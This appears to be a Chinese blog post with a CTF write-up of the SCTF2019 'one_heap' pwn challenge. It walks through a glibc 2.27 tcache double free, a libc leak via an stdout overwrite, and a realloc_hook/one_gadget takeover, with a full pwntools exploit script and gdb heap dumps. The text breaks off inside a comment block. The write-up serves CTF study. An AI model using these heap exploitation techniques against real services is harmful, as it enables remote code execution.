<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="pwn," />










<meta name="description" content="周末和大佬们打了SCTF，太菜了，感觉自己做的题目还是太少，见的类型也少，天枢这次一共做了3道pwn题，第一天都卡在one_heap了，free四次真的太少了，第二天早上two_heap和easy_heap出的很快，easy_heap和姚老板在TSCTF2019上出的babyheap一样，我还没把脚本改完大佬已经拿到了1血…">
<meta name="keywords" content="pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="SCTF2019 pwn">
<meta property="og:url" content="http://x3h1n.github.io/2019/06/24/SCTF2019-pwn/index.html">
<meta property="og:site_name" content="X3h1n">
<meta property="og:description" content="周末和大佬们打了SCTF，太菜了，感觉自己做的题目还是太少，见的类型也少，天枢这次一共做了3道pwn题，第一天都卡在one_heap了，free四次真的太少了，第二天早上two_heap和easy_heap出的很快，easy_heap和姚老板在TSCTF2019上出的babyheap一样，我还没把脚本改完大佬已经拿到了1血…">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2019-07-08T03:15:53.021Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="SCTF2019 pwn">
<meta name="twitter:description" content="周末和大佬们打了SCTF，太菜了，感觉自己做的题目还是太少，见的类型也少，天枢这次一共做了3道pwn题，第一天都卡在one_heap了，free四次真的太少了，第二天早上two_heap和easy_heap出的很快，easy_heap和姚老板在TSCTF2019上出的babyheap一样，我还没把脚本改完大佬已经拿到了1血…">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","3display":"post","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://x3h1n.github.io/2019/06/24/SCTF2019-pwn/"/>





  <title>SCTF2019 pwn | X3h1n</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">X3h1n</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://x3h1n.github.io/2019/06/24/SCTF2019-pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="X3h1n">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">SCTF2019 pwn</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-24T15:35:50+08:00">
                2019-06-24
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>周末和大佬们打了SCTF，太菜了，感觉自己做的题目还是太少，见的类型也少，天枢这次一共做了3道pwn题，第一天都卡在one_heap了，free四次真的太少了，第二天早上two_heap和easy_heap出的很快，easy_heap和姚老板在TSCTF2019上出的babyheap一样，我还没把脚本改完大佬已经拿到了1血…<br><a id="more"></a></p>
<h1 id="one-heap"><a href="#one-heap" class="headerlink" title="one_heap"></a>one_heap</h1><p>这道题我只做到利用三次free泄露libc，然后就没有重叠的块了，剩下的一次free的机会也没法用。这个exp是队里整理的exp，我也分不清是谁做的了，好像大家都参与了。</p>
<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目有add和delete两个功能，只允许add15次，free4次，每次free的都是最新add的chunk。</p>
<p>因为没有show函数，需要修改stdout泄露libc。</p>
<p>libc是2.27，有tcache。</p>
<h2 id="新的劫持控制流方式"><a href="#新的劫持控制流方式" class="headerlink" title="新的劫持控制流方式"></a>新的劫持控制流方式</h2><p>这里学到了一种新的劫持控制流的方法，之前只是覆写malloc_hook为one_gadget，但是这道题目所有的one_gadget都不能成功，因为malloc_hook的低8字节处就是realloc_hook，可以将malloc_hook覆写为realloc函数的地址，将realloc_hook覆写为one_gadget，这样在执行malloc函数时会跳转到realloc函数中去执行，在realloc函数有一些对栈的操作能够满足one_gadget的要求，因为realloc_hook不为空，就会跳转到realloc_hook来执行，从而跳转到one_gadget执行。</p>
<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>因为只有4次free，泄露libc需要main_arena的地址，需要让double free的chunk进入到unsorted bin中，如果double free使用了2次free，进入unsorted bin还要用一次free。另外一次free还需要构造好重叠块。</p>
<p>首先构造double free，另外在最后一个chunk中伪造一个prev_size和size，为后面chunk overlapping做准备。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">New(<span class="number">0x7f</span>,<span class="string">'\n'</span>) <span class="comment">#0</span></span><br><span class="line">New(<span class="number">0x7f</span>,<span class="string">'\n'</span>) <span class="comment">#1</span></span><br><span class="line">Delete()</span><br><span class="line">Delete()</span><br><span class="line">New(<span class="number">0x2f</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x90</span>) + <span class="string">'\x20'</span> + <span class="string">'\n'</span>) <span class="comment">#2</span></span><br><span class="line">Delete()</span><br></pre></td></tr></table></figure>
<p>伪造的chunk在#2中，具体如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /<span class="number">10</span>gx <span class="number">0x555555757370</span></span><br><span class="line"><span class="number">0x555555757370</span>: <span class="number">0x0000000000000090</span>  <span class="number">0x0000000000000040</span></span><br><span class="line"><span class="number">0x555555757380</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757390</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557573a0</span>: <span class="number">0x0000000000000090</span>  <span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5555557573b0</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020c51</span>  <span class="comment">#top chunk</span></span><br></pre></td></tr></table></figure>
<p>此时，bins里面已经有double free，另外最后申请的0x40的chunk已经进入tcache。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x5555557573b0</span> (size : <span class="number">0x20c50</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)   tcache_entry[<span class="number">2</span>](<span class="number">1</span>): <span class="number">0x555555757380</span></span><br><span class="line">(0x90)   tcache_entry[7](2): 0x5555557572f0 --&gt; 0x5555557572f0 (overlap chunk with 0x5555557572e0(freed) )</span><br></pre></td></tr></table></figure>
<p>再连续申请3个0x90的chunk，输入为换行符相当于不在chunk里写入内容，导致tcache 0x90中的chunk一直指向自己，一直在tcache里申请chunk，tcache 0x90的chunk的数目从0变为负数，此时再次释放一个0x90的chunk会导致其进入unsorted bin中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">New(<span class="number">0x7f</span>,<span class="string">'\n'</span>) <span class="comment">#3</span></span><br><span class="line">New(<span class="number">0x7f</span>,<span class="string">'\n'</span>) <span class="comment">#4</span></span><br><span class="line">New(<span class="number">0x7f</span>,<span class="string">'\n'</span>) <span class="comment">#5</span></span><br><span class="line">Delete()</span><br></pre></td></tr></table></figure>
<p>此时tcache中double free的chunk进入到unsorted bin中，我们就有了0x7f的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x5555557573b0 (size : 0x20c50) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x5555557572e0 (size : 0x90)</span><br><span class="line">(0x40)   tcache_entry[2](1): 0x555555757380</span><br><span class="line">(0x90)   tcache_entry[7](255): 0x5555557572f0 (overlap chunk with 0x5555557572e0(freed) )</span><br></pre></td></tr></table></figure>
<p>此时再申请一个0x30的chunk，会从unsortedbin里分割给用户，并覆盖fd的低字节为stdout的地址，使得tcache中0x90的fd指向stdout，因为unsortedbin和tcache 0x90的chunk是重叠的，再次申请一个0x90的chunk，然后修改unsortedbin的chunk大小为0x90，因为我们之前在0x555555757370处伪造了一个0x90，此时正好对上。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x5555557573b0 (size : 0x20c50) </span><br><span class="line">       last_remainder: 0x555555757310 (size : 0x90) </span><br><span class="line">            unsortbin: 0x555555757310 (size : 0x90) #由0x60修改为0x90</span><br><span class="line">(0x40)   tcache_entry[2](1): 0x555555757380 (overlap chunk with 0x555555757310(freed) )</span><br><span class="line">(0x90)   tcache_entry[7](254): 0x7ffff7dd0760 --&gt; 0xfbad2887 (invaild memory)</span><br></pre></td></tr></table></figure>
<p>我们之前伪造的0x90，这样伪造我们在unsortedbin和tcahe 0x40处就又有了重叠的chunk。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /20gx 0x555555757310</span><br><span class="line">0x555555757310: 0x0000000000000000  0x0000000000000091</span><br><span class="line">0x555555757320: 0x00007ffff7dcfca0  0x00007ffff7dcfca0</span><br><span class="line">0x555555757330: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555757340: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555757350: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555757360: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555757370: 0x0000000000000060  0x0000000000000040</span><br><span class="line">0x555555757380: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555757390: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557573a0: 0x0000000000000090  0x0000000000000020</span><br></pre></td></tr></table></figure>
<p>对应的操作如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New(<span class="number">0x20</span>,<span class="string">'\x60\x07\xdd'</span>+<span class="string">'\n'</span>) <span class="comment">#6 </span></span><br><span class="line">New(<span class="number">0x7f</span>, p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x91</span>) + <span class="string">'\n'</span>) <span class="comment">#7</span></span><br></pre></td></tr></table></figure>
<p>然后申请到stdout的chunk，泄露libc：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">New(<span class="number">0x7f</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>+<span class="string">'\n'</span>) <span class="comment">#8  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">##libc</span></span><br><span class="line">p.recvn(<span class="number">8</span>)</span><br><span class="line">leak_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak_addr - (<span class="number">0x7ffff7dd18b0</span><span class="number">-0x00007ffff79e4000</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br><span class="line">    </span><br><span class="line">realloc_hook = libc.symbols[<span class="string">'__realloc_hook'</span>] + libc_base</span><br><span class="line">realloc = libc_base + libc.symbols[<span class="string">"realloc"</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a38c</span></span><br></pre></td></tr></table></figure>
<p>此时再从unsortedbin中申请一个0x70的chunk，正好可以修改tcache 0x40中chunk的fd：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New(<span class="number">0x68</span>, p64(<span class="number">0</span>) * <span class="number">11</span> + p64(<span class="number">0x41</span>) + p64(realloc_hook))</span><br></pre></td></tr></table></figure>
<p>fd指向realloc_hook：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x5555557573b0 (size : 0x20c50) </span><br><span class="line">       last_remainder: 0x555555757380 (size : 0x20) </span><br><span class="line">            unsortbin: 0x555555757380 (size : 0x20)</span><br><span class="line">(0x40)   tcache_entry[2](1): 0x555555757380 (overlap chunk with 0x555555757380(freed) )</span><br><span class="line">(0x90)   tcache_entry[7](253): 0xfbad2887 (invaild memory)</span><br><span class="line">gdb-peda$ x /8gx 0x555555757380 </span><br><span class="line">0x555555757380: 0x00007ffff7dcfc28  0x0000000000000021</span><br><span class="line">0x555555757390: 0x00007ffff7dcfca0  0x00007ffff7dcfca0</span><br><span class="line">0x5555557573a0: 0x0000000000000020  0x0000000000000020</span><br><span class="line">0x5555557573b0: 0x0000000000000000  0x0000000000020c51</span><br><span class="line">gdb-peda$ p &amp;__realloc_hook</span><br><span class="line">$1 = (void *(**)(void *, size_t, const void *)) 0x7ffff7dcfc28 &lt;__realloc_hook&gt;</span><br></pre></td></tr></table></figure>
<p>申请两次申请到realloc_hook的chunk，修改realloc_hook为one_gadget，修改malloc_hook为realloc函数+4的位置，最后申请chunk触发malloc_hook，然后跳转至realloc函数执行，因为realloc_hoo不为空，导致触发one_gadget。</p>
<p>完整exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./one_heap'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'47.104.89.129'</span>,<span class="number">23333</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Input the size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Input the content:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    New(<span class="number">0x7f</span>,<span class="string">'\n'</span>) <span class="comment">#0</span></span><br><span class="line">    New(<span class="number">0x7f</span>,<span class="string">'\n'</span>) <span class="comment">#1</span></span><br><span class="line">    Delete()</span><br><span class="line">    Delete()</span><br><span class="line">    New(<span class="number">0x2f</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x90</span>) + <span class="string">'\x20'</span> + <span class="string">'\n'</span>) <span class="comment">#2</span></span><br><span class="line">    Delete()</span><br><span class="line">    </span><br><span class="line">    New(<span class="number">0x7f</span>,<span class="string">'\n'</span>) <span class="comment">#3</span></span><br><span class="line">    New(<span class="number">0x7f</span>,<span class="string">'\n'</span>) <span class="comment">#4</span></span><br><span class="line">    New(<span class="number">0x7f</span>,<span class="string">'\n'</span>) <span class="comment">#5</span></span><br><span class="line">    Delete()</span><br><span class="line"></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    </span><br><span class="line">    New(<span class="number">0x20</span>,<span class="string">'\x60\x07\xdd'</span>+<span class="string">'\n'</span>) <span class="comment">#6   </span></span><br><span class="line">    New(<span class="number">0x7f</span>, p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x91</span>) + <span class="string">'\n'</span>) <span class="comment">#7   </span></span><br><span class="line">    New(<span class="number">0x7f</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>+<span class="string">'\n'</span>) <span class="comment">#8</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">##libc</span></span><br><span class="line">    p.recvn(<span class="number">8</span>)</span><br><span class="line">    leak_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    libc_base = leak_addr - (<span class="number">0x7ffff7dd18b0</span><span class="number">-0x00007ffff79e4000</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br><span class="line">    </span><br><span class="line">    realloc = libc.symbols[<span class="string">'realloc'</span>] + libc_base</span><br><span class="line">    realloc_hook = libc.symbols[<span class="string">"__realloc_hook"</span>] + libc_base</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x10a38c</span></span><br><span class="line">   </span><br><span class="line">    New(<span class="number">0x68</span>, p64(<span class="number">0</span>) * <span class="number">11</span> + p64(<span class="number">0x41</span>) + p64(realloc_hook)) <span class="comment">#9  </span></span><br><span class="line">    New(<span class="number">0x38</span>, <span class="string">'\n'</span>) <span class="comment">#10</span></span><br><span class="line">    New(<span class="number">0x38</span>, p64(one_gadget)+p64(realloc+<span class="number">4</span>) + <span class="string">'\n'</span>) <span class="comment">#11</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">##trigger</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br><span class="line">    New(<span class="number">0x50</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe569f execve("/bin/sh", r14, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r14] == NULL || r14 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe5858 execve("/bin/sh", [rbp-0x88], [rbp-0x70])</span></span><br><span class="line"><span 